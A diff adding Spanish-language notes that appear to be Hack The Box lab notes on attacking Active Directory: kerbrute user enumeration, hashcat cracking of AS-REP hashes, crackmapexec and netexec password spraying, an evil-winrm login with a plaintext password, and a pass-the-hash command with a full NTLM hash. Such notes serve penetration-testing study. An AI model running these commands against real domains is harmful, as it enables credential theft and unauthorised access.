@@ -1,0 +1,39 @@
+
+- Enumerar usuarios
+```bash
+kerbrute userenum -d DOMAIN.LOCAL --dc $IP users.txt
+```
+
+- Si saca un `TGT` entonces lo crackeamos
+```bash
+hashcat --example-hashes| grep "krb5asrep" -B 11
+
+hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
+
+- Compruebas la contraseña, si sale `pwned` podras acceder al sistema.
+```bash
+crackmapexec smb 10.10.10.175 -u "fsmith" -p pass.txt
+```
+- Si el puerto 5985 esta abierto probamos a ver si sale pwned
+```bash
+crackmapexec winrm 10.10.10.175 -u "fsmith" -p pass.txt
+
+evil-winrm -i 10.10.10.175 -u "fsmith" -p "Thestrokes23"
+```
+
+
+- Probar usuarios
+```bash
+netexec smb 10.10.11.51 -u users -p passwd --continue-on-success
+```
+
+- Añade tambien para que pruebe en local
+```bash
+netexec smb 10.10.11.51 -u users -p passwd --continue-on-success --local
+```
+
+- PassTheHash
+```bash
+netexec smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
+```
